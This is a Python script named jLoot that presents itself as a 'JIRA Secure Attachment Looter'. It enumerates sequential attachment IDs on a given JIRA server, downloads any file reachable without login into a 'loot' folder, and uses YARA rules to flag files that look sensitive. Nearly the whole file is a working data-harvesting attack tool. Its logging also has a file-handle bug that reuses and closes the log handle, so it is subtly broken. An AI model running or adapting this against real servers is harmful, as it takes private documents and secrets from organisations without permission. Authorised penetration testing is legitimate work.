import urllib.request
from socket import timeout
import argparse
import os
import yara


parser = argparse.ArgumentParser(description='jLoot - JIRA Secure Attachment Looter')
# jURL is required
parser.add_argument('-u',action='store',dest='jURL', help="JIRA Base URL")
# startf is required. Default value is 10000
parser.add_argument('-s',action='store',dest='startf',type=int, default=10000, help="Start File")
# flimit is required
parser.add_argument('-l',action='store',dest='flimit',type=int, help="File Limit")
parser.add_argument('-o',action='store',dest='outdir', help="Output Directory - Default 'loot/'")
parser.add_argument('-y',action='store',dest='yaraRules', help="Custom Yara Rules")
parser.add_argument('-e',action='store',dest='logoutput', help="Output log file")
args = parser.parse_args()
startf = args.startf
flimit = args.flimit
jURL = args.jURL
attachURL = jURL + "/secure/attachment/"
if args.outdir:
    outdir = args.outdir + '/'
    if not os.path.exists(outdir):
        os.mkdir(outdir)
else:
    outdir = 'loot/'
if args.yaraRules:
    rules = yara.compile(args.yaraRules)
else:
    rules = yara.compile('jLoot.yar') # These are the stock yara rules.
if args.logoutput:
    logoutput = args.logoutput
    if not os.path.exists(logoutput + ".txt"):
        logoutput = logoutput
else:
    logoutput = "log"

#Opening the log file
f = open(logoutput + ".txt","wt")

# Matching callback
def yaraMatch(data):
  print(" | \u001b[41m"+data["rule"], end="\u001b[0m")
  print(" | \u001b[41m"+data["rule"], end="\u001b[0m", file=f)
  return yara.CALLBACK_CONTINUE

i = 0
while i < flimit:
    fileNum = str(startf+i)
    try:
        url = attachURL+fileNum+'/'
        response = urllib.request.urlopen(url,timeout=2)
        fileName = response.headers.get_filename()
        data = response.read()
        if fileName != None:
            print("\u001b[32;1m[+]\u001b[0m {}: {}".format(fileNum,fileName),end="")
            print("\u001b[32;1m[+]\u001b[0m {}: {}".format(fileNum,fileName),end="", file=f)
            matches = rules.match(data=data,callback=yaraMatch, which_callbacks=yara.CALLBACK_MATCHES,timeout=10)
            print()
            print(file=f)
            if matches:
                fileNum = "CHECK_"+fileNum
            with open(outdir+fileNum+'_'+fileName,'wb') as f:
                f.write(data)
                f.close()
        else:
            print("\u001b[31;1m[-]\u001b[0m {}: Not found".format(fileNum))
            print("\u001b[31;1m[-]\u001b[0m {}: Not found".format(fileNum), file=f)
        i = i + 1
    except urllib.error.HTTPError:
        print("\u001b[31;1m[-]\u001b[0m {}: 404".format(fileNum))
        print("\u001b[31;1m[-]\u001b[0m {}: 404".format(fileNum), file=f)
        i = i+1
    except timeout:
        print("\u001b[31;1m[-]\u001b[0m Timeout...")
        print("\u001b[31;1m[-]\u001b[0m Timeout...", file=f)
        i = i+1
        continue
#Closing the log file
f.close()
# When response is 404, that means the page does not exist.
# When response is not found, that means the page exists, but you need to be logged in to access it.
